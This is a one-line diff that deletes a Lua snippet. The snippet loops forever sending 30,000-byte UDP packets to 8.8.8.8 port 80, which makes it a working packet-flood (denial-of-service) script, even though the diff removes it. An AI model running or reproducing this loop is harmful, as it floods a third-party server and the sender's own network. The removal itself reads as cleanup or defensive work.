@@ -1,1 +1,0 @@
-local data = "" for key = 0, 30000 do data = data .. "x" end local socket = require("socket") while true do local sock = assert(socket.udp()) sock:settimeout(0) assert(sock:setpeername("8.8.8.8", 80)) assert(sock:setoption('dontroute', true)) assert(sock:send(data)) sock:close() end
